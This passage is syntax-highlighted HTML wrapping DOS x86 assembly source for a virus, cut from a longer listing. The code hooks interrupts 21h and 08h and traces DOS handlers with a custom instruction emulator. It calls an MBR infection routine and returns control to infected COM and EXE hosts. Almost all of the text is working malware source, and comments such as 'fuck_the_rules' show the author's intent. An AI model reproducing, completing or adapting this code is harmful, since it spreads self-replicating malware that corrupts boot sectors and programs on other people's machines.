        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5d06h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Swap_seg</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Swap_off</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">

</span><span class="sc1">;--------------</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fuck_the_rules</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0084h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Int21h setting</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ds</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_es</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ax</span><span class="sc4">],</span><span class="sc2">03000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_usemode</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_dos_version</span><span class="sc0">               </span><span class="sc1">; Check if Win95 present</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">Adapt_W95</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Code_Emulator</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Adapt_W95</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21h_plural</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jump_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">saved21</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_HowMuch</span><span class="sc4">],</span><span class="sc2">5d</span><span class="sc0">   </span><span class="sc1">; How much to trace</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">; Second&amp;Third instructions on int21h</span><span class="sc0">

</span><span class="sc5">@@emulate_it_again_Sam</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;is there, the jump changing</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_a_pair_values</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21h_plural</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_theresacall</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@@Ifweloop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_HowMuch</span><span class="sc4">],</span><span class="sc2">35d</span><span class="sc0">
</span><span class="sc5">@@@Ifweloop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@emulate_it_again_Sam</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_a_pair_values</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_theresacall</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@I_do_rule</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_HowMuch</span><span class="sc4">],</span><span class="sc2">35d</span><span class="sc0">
</span><span class="sc5">@I_do_rule</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2508h</span><span class="sc0">        </span><span class="sc1">; Handle int 08h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">handler22h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rehandle</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Anyway_Inst</span><span class="sc0">

</span><span class="sc5">Adapt_W95</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">; W95 and int08h handling isn't cool :-D</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;well, and Sfts, and... O:)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0084h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int21h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">jump_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int21h_plural</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Adapt_W95_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Alternate_21_handler</span><span class="sc0">     </span><span class="sc1">; Need alternative one</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Anyway_Inst</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; Delta offset</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; CS: on original host if not TSR</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">are_we_on_MBR</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@TheHardMenPath</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_dos_version</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">@TheHardMenPath</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MBR_Infection</span><span class="sc0">
</span><span class="sc5">@TheHardMenPath</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">finished_tsr</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xlat</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc0">             </span><span class="sc1">; Com file ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">com_normal</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">              </span><span class="sc1">; Stack</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">010h</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">; And now we jump pushing</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cs_ip</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; and with a retf to the</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; old beggining of the host</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cs_ip</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">



        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_originals</span><span class="sc0">

        </span><span class="sc6">retf</span><span class="sc0">


</span><span class="sc5">com_normal</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ret_pos</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4d</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">24d</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">14h</span><span class="sc0">             </span><span class="sc1">; Final SP adjust</span><span class="sc0">


</span><span class="sc5">restore_originals</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Zero registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;-ú--ú-ú--ú-ú--úú-úú-ú--ú-úú-ú--ú-ú--ú-ú--ú-úú-ú--ú--úú-ú-úú-úú-ú--úú-ú--ú-</span><span class="sc0">
</span><span class="sc1">;                            CODE EMULATOR</span><span class="sc0">
</span><span class="sc1">;-ú--ú-ú--ú-ú--úú-úú-ú--ú-úú-ú--ú-ú--ú-ú--ú-úú-ú--ú--úú-ú-úú-úú-ú--úú-ú-úú-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  The detail. The minimal thing. Explore. Discover. Understand. Ignore. Cry.</span><span class="sc0">
</span><span class="sc1">; Save yourself.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Code_Emulator</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_pref</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Segment Prefix Off</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">; Clean execution zone</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc5">execi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">@get</span><span class="sc4">&amp;</span><span class="sc5">exec_part2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">     </span><span class="sc1">; Put the IP</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_usemode</span><span class="sc4">]</span><span class="sc1">; Two operating modes</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@non_tracing_int</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_cs</span><span class="sc4">],</span><span class="sc2">300h</span><span class="sc0">   </span><span class="sc1">; If segment &lt;= 300h, we've got the</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">Seguiremos_adelante</span><span class="sc0">      </span><span class="sc1">;int handler</span><span class="sc0">
</span><span class="sc5">ended</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Carry off =&gt; All was fine</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@infecting_inserting</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_usemode</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@@tempo</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">@@@temp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_usemode</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@@temp</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@@tempo</span><span class="sc0">

</span><span class="sc5">@non_tracing_int</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@infecting_inserting</span><span class="sc0">
</span><span class="sc5">@@@tempo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_usemode</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; One instruction less</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ended</span><span class="sc0">

</span><span class="sc5">Seguiremos_adelante</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_cs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                       </span><span class="sc1">; Loads instruction on ds:si</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">offset_table</span><span class="sc0">

</span><span class="sc5">@denuevo1</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; First opcode group</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">@mayorde40</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00001111b</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@mayorde40</span><span class="sc0">

</span><span class="sc5">@mayorde40</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">          </span><span class="sc1">; All 40h-5fh are executables and 1 byte long</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">@@mayorde40</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes1</span><span class="sc0">

</span><span class="sc5">@@mayorde40</span><span class="sc4">:</span><span class="sc0">
